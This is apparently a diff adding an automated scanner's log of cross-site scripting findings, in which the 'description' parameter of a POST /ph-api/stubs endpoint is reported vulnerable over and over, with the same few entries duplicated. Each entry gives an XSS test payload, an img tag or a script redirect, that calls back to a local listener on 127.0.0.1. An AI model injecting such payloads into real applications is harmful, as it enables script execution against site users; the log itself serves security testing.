@@ -1,0 +1,78 @@
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /ph-api/stubs
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/ph-api/stubsLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /ph-api/stubs
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/ph-api/stubsLLMdescription'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /ph-api/stubs
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/ph-api/stubsLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /ph-api/stubs
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/ph-api/stubsLLMdescription'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /ph-api/stubs
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/ph-api/stubsLLMdescription'</script>
+
+API Vul Type: xss
+Vul API Url: /ph-api/stubs
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/ph-api/stubsLLMdescription'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /ph-api/stubs
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/ph-api/stubsLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /ph-api/stubs
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='http://127.0.0.1:4445/xss/ph-api/stubsLLMdescription'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /ph-api/stubs
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/ph-api/stubsLLMdescription'>
+
+API Vul Type: xss
+Vul API Url: /ph-api/stubs
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <img src='https://127.0.0.1:4446/xss/ph-api/stubsLLMdescription'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /ph-api/stubs
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/ph-api/stubsLLMdescription'</script>
+
+API Vul Type: xss
+Vul API Url: /ph-api/stubs
+Vul API Method: Post
+API Vul Param: description
+API Test Payload: <script>window.location='http://127.0.0.1:4445/xss/ph-api/stubsLLMdescription'</script>
+
